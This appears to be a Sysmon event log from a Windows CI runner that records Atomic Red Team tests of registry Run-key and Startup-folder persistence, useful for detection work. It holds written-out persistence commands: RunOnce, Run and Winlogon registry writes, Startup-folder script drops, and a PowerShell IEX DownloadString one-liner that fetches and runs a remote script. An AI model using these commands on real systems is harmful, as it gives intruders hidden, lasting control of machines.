"12/17/2025 7:59:14 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:14.809
ProcessGuid: {f995aebf-62d2-6942-0d05-000000000e00}
ProcessId: 6236
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit-backup
Details: C:\Windows\system32\userinit.exe,
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:14.628
ProcessGuid: {f995aebf-62d2-6942-0d05-000000000e00}
ProcessId: 6236
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yiubzasg.fmo.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:14 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:14.610
ProcessGuid: {f995aebf-62d2-6942-0d05-000000000e00}
ProcessId: 6236
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yiubzasg.fmo.ps1
CreationUtcTime: 2025-12-17 07:59:14.610
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:13.963
ProcessGuid: {f995aebf-62d1-6942-0b05-000000000e00}
ProcessId: 5508
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zxeedbpf.elh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:13 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:13.942
ProcessGuid: {f995aebf-62d1-6942-0b05-000000000e00}
ProcessId: 5508
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zxeedbpf.elh.ps1
CreationUtcTime: 2025-12-17 07:59:13.942
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:13.265
ProcessGuid: {f995aebf-62d1-6942-0905-000000000e00}
ProcessId: 3084
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0thbvtbw.hf0.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:13 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:13.247
ProcessGuid: {f995aebf-62d1-6942-0905-000000000e00}
ProcessId: 3084
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0thbvtbw.hf0.ps1
CreationUtcTime: 2025-12-17 07:59:13.247
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:12.926
ProcessGuid: {f995aebf-62d0-6942-0705-000000000e00}
ProcessId: 3592
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\atomictest\calc.exe
CreationUtcTime: 2025-12-17 07:59:12.336
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:12.926
ProcessGuid: {f995aebf-62d0-6942-0705-000000000e00}
ProcessId: 3592
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\atomictest\calc.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: false
Archived: true"
"12/17/2025 7:59:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:12.677
ProcessGuid: {f995aebf-62d0-6942-0705-000000000e00}
ProcessId: 3592
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_t5u34uz5.3yp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:12.659
ProcessGuid: {f995aebf-62d0-6942-0705-000000000e00}
ProcessId: 3592
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_t5u34uz5.3yp.ps1
CreationUtcTime: 2025-12-17 07:59:12.659
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:12.336
ProcessGuid: {f995aebf-62d0-6942-0505-000000000e00}
ProcessId: 3720
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\atomictest\calc.exe
CreationUtcTime: 2025-12-17 07:59:12.336
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:12.126
ProcessGuid: {f995aebf-62d0-6942-0505-000000000e00}
ProcessId: 3720
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mjjtkarn.s3v.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:12.108
ProcessGuid: {f995aebf-62d0-6942-0505-000000000e00}
ProcessId: 3720
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mjjtkarn.s3v.ps1
CreationUtcTime: 2025-12-17 07:59:12.108
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:11 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:11.798
ProcessGuid: {f995aebf-62cf-6942-0305-000000000e00}
ProcessId: 8992
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\socks5_powershell
Details: powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:11 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:11.616
ProcessGuid: {f995aebf-62cf-6942-0305-000000000e00}
ProcessId: 8992
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2kszhtbq.f1s.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:11 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:11.596
ProcessGuid: {f995aebf-62cf-6942-0305-000000000e00}
ProcessId: 8992
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_2kszhtbq.f1s.ps1
CreationUtcTime: 2025-12-17 07:59:11.596
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:10.664
ProcessGuid: {f995aebf-62ce-6942-fd04-000000000e00}
ProcessId: 1768
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_aicl13vo.4jh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:10 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:10.640
ProcessGuid: {f995aebf-62ce-6942-fd04-000000000e00}
ProcessId: 1768
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_aicl13vo.4jh.ps1
CreationUtcTime: 2025-12-17 07:59:10.640
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:10 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:10.042
ProcessGuid: {f995aebf-62cd-6942-f404-000000000e00}
ProcessId: 4032
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat
CreationUtcTime: 2025-12-17 07:59:10.039
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:09 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:09.835
ProcessGuid: {f995aebf-62cd-6942-f404-000000000e00}
ProcessId: 4032
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_br2bdwrj.fnh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:09 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:09.813
ProcessGuid: {f995aebf-62cd-6942-f404-000000000e00}
ProcessId: 4032
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_br2bdwrj.fnh.ps1
CreationUtcTime: 2025-12-17 07:59:09.813
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:09 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:09.466
ProcessGuid: {f995aebf-62cd-6942-f304-000000000e00}
ProcessId: 9960
Image: C:\Windows\System32\cscript.exe
FileVersion: 10.0.26100.7019
Description: Microsoft ? Console Based Script Host
Product: Microsoft ? Windows Script Host
Company: Microsoft Corporation
OriginalFileName: cscript.exe
CommandLine: ""C:\Windows\system32\cscript.exe"" /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9521FCB41599FBEE8F44182F77E19F0FCA97D4E8199B1E8D97FCAD66B5A55DB2
ParentProcessGuid: {f995aebf-62cd-6942-f004-000000000e00}
ParentProcessId: 8168
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""
cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\""""
cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:09 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:09.419
ProcessGuid: {f995aebf-62cd-6942-f204-000000000e00}
ProcessId: 7232
Image: C:\Windows\System32\cscript.exe
FileVersion: 10.0.26100.7019
Description: Microsoft ? Console Based Script Host
Product: Microsoft ? Windows Script Host
Company: Microsoft Corporation
OriginalFileName: cscript.exe
CommandLine: ""C:\Windows\system32\cscript.exe"" /E:Jscript ""C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9521FCB41599FBEE8F44182F77E19F0FCA97D4E8199B1E8D97FCAD66B5A55DB2
ParentProcessGuid: {f995aebf-62cd-6942-f004-000000000e00}
ParentProcessId: 8168
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\jsestartup.jse\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""
cscript.exe /E:Jscript \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse\""""
cscript.exe /E:Jscript \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:09 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:09.231
ProcessGuid: {f995aebf-62cd-6942-f004-000000000e00}
ProcessId: 8168
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fg2tqd0y.zjl.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:09 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:09.215
ProcessGuid: {f995aebf-62cd-6942-f004-000000000e00}
ProcessId: 8168
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fg2tqd0y.zjl.ps1
CreationUtcTime: 2025-12-17 07:59:09.215
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:08 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:08.873
ProcessGuid: {f995aebf-62cc-6942-ef04-000000000e00}
ProcessId: 5276
Image: C:\Windows\System32\cscript.exe
FileVersion: 10.0.26100.7019
Description: Microsoft ? Console Based Script Host
Product: Microsoft ? Windows Script Host
Company: Microsoft Corporation
OriginalFileName: cscript.exe
CommandLine: ""C:\Windows\system32\cscript.exe"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9521FCB41599FBEE8F44182F77E19F0FCA97D4E8199B1E8D97FCAD66B5A55DB2
ParentProcessGuid: {f995aebf-62cc-6942-ec04-000000000e00}
ParentProcessId: 7412
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:08 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:08.816
ProcessGuid: {f995aebf-62cc-6942-ee04-000000000e00}
ProcessId: 9944
Image: C:\Windows\System32\cscript.exe
FileVersion: 10.0.26100.7019
Description: Microsoft ? Console Based Script Host
Product: Microsoft ? Windows Script Host
Company: Microsoft Corporation
OriginalFileName: cscript.exe
CommandLine: ""C:\Windows\system32\cscript.exe"" ""C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9521FCB41599FBEE8F44182F77E19F0FCA97D4E8199B1E8D97FCAD66B5A55DB2
ParentProcessGuid: {f995aebf-62cc-6942-ec04-000000000e00}
ParentProcessId: 7412
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:08 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:08.807
ProcessGuid: {f995aebf-62cc-6942-ec04-000000000e00}
ProcessId: 7412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs
CreationUtcTime: 2025-12-17 07:59:08.807
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:08.630
ProcessGuid: {f995aebf-62cc-6942-ec04-000000000e00}
ProcessId: 7412
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f1qlwsat.0k5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:08 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:08.613
ProcessGuid: {f995aebf-62cc-6942-ec04-000000000e00}
ProcessId: 7412
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f1qlwsat.0k5.ps1
CreationUtcTime: 2025-12-17 07:59:08.613
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:08 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:08.315
ProcessGuid: {f995aebf-62cc-6942-ea04-000000000e00}
ProcessId: 2588
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun
Details: powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:08.136
ProcessGuid: {f995aebf-62cc-6942-ea04-000000000e00}
ProcessId: 2588
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_h3xvg52u.uiq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:08 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:08.120
ProcessGuid: {f995aebf-62cc-6942-ea04-000000000e00}
ProcessId: 2588
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_h3xvg52u.uiq.ps1
CreationUtcTime: 2025-12-17 07:59:08.120
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:08 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:08.047
ProcessGuid: {f995aebf-62cc-6942-ea04-000000000e00}
ProcessId: 2588
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""""
set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-552e-6942-89d0-0b0000000000}
LogonId: 0xBD089
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-6203-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\cb932f1c-bec9-45d5-9be7-d59944af95ba.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:07 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:07.832
ProcessGuid: {f995aebf-62cb-6942-e904-000000000e00}
ProcessId: 9072
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1
Details: C:\Path\AtomicRedTeam.dll
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:07 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:07.832
ProcessGuid: {f995aebf-62cb-6942-e904-000000000e00}
ProcessId: 9072
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:07 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:07.832
ProcessGuid: {f995aebf-62cb-6942-e904-000000000e00}
ProcessId: 9072
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:07 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:07.832
ProcessGuid: {f995aebf-62cb-6942-e904-000000000e00}
ProcessId: 9072
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:07 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:07.587
ProcessGuid: {f995aebf-62cb-6942-e604-000000000e00}
ProcessId: 3340
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team
Details: C:\Path\AtomicRedTeam.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:07 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:07.587
ProcessGuid: {f995aebf-62cb-6942-e604-000000000e00}
ProcessId: 3340
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:06 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:06.280
ProcessGuid: {f995aebf-62ca-6942-e004-000000000e00}
ProcessId: 7116
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_iphonvw3.00v.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:06 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:06.263
ProcessGuid: {f995aebf-62ca-6942-e004-000000000e00}
ProcessId: 7116
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_iphonvw3.00v.ps1
CreationUtcTime: 2025-12-17 07:59:06.263
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:05.814
ProcessGuid: {f995aebf-62c9-6942-de04-000000000e00}
ProcessId: 4340
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_b2qrffvh.hik.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:05 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:05.798
ProcessGuid: {f995aebf-62c9-6942-de04-000000000e00}
ProcessId: 4340
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_b2qrffvh.hik.ps1
CreationUtcTime: 2025-12-17 07:59:05.796
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:05.431
ProcessGuid: {f995aebf-62c9-6942-db04-000000000e00}
ProcessId: 6968
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0uuoo3yv.b4p.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:05 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:05.414
ProcessGuid: {f995aebf-62c9-6942-db04-000000000e00}
ProcessId: 6968
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0uuoo3yv.b4p.ps1
CreationUtcTime: 2025-12-17 07:59:05.414
